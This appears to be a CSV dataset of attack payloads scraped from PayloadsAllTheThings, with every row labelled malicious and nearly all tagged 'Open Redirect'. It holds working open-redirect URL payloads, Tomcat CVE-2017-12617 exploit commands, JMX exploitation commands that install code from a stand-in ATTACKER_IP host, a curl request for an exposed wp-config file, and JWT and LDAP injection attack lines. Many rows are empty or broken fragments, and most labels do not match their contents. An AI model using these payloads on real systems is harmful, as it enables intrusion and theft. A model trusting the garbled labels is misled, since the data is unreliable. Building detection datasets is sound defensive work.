Payload,Signature,AttackType,Severity,MITRE,Label,Description
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
REDIRECT_URI=,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
LOGOUT_REDIRECT_URI=,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
SNOOWRAP_REDIRECT_URI=,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
url = 'https://URL.com/',OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"r = requests.get(""http://ctf.web?action=dir&search=admin*)(password="" + flag + char)",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"r = Net::HTTP.get(URI(""http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}""))",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
""kid"""":""""http://localhost:7070/privKey.key""""""",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Inject headers with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Inject payload claims with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    1. Add a """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
- Dictionary attack: ",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    3. Replace the """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* uniqid: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py -u http://127.0.0.1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py --url http://127.0.0.1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py -u http://127.0.0.1 -p pwn,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py -u http://127.0.0.1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py --url http://127.0.0.1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py -u http://127.0.0.1 -p pwn,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https:///example.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://example.com/%2e%2e%2f,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://example.com//,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/http://example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://%09/example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://%5cexample.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https:///example.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https:///example.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com/%2e%2e%2f,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://example.com/%2f..,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
